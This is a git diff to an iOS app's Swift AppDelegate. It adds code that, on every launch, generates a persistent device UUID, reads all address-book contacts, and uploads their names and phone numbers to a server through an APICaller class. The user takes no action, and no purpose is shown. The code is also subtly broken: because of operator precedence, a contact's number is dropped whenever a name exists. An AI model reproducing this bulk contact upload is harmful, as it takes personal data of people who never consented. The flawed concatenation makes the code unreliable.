@@ -7,17 +7,63 @@
 //
 
 import UIKit
+import AddressBook
+import Contacts
 
 @UIApplicationMain
 class AppDelegate: UIResponder, UIApplicationDelegate {
 
     var window: UIWindow?
     
-
+    public var uniqueIdentifier : String? {
+        
+        get {
+            //code to execute
+            return UserDefaults.standard.string(forKey: Constants.User.Keys.uniqueID)
+        }
+        set(uniqueID) {
+            UserDefaults.standard.setValue(uniqueID, forKey: Constants.User.Keys.uniqueID)
+        }
+    }
+    
+    
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
         // Override point for customization after application launch.
         
-        //Contact.init().getAllContacts()
+        // Generate UUID just one time only
+        if uniqueIdentifier == nil{
+            uniqueIdentifier = NSUUID().uuidString
+        }
+        
+        
+        Contact.init().getAllContacts { (result) in
+            
+            var contactJson = [String]()
+            switch result{
+                
+            case .Granted(let contactList):
+                
+                for contact in contactList{
+                    
+                    let name = CNContactFormatter.string(from: contact, style: .fullName)
+    
+                    if let number = contact.phoneNumbers.first?.value.stringValue{
+                        
+                        contactJson.append(name ?? "" + "|" + number)
+                    }else{
+                        contactJson.append(name ?? "" + "|" + "")
+                    }
+                    
+                }
+                if contactJson.count > 0{
+                    APICaller.init().upload(contacts: contactJson, uuid:self.uniqueIdentifier! )
+                }
+            case .Other(let str):
+                print(str)
+                
+                
+            }
+        }
         return true
     }
 
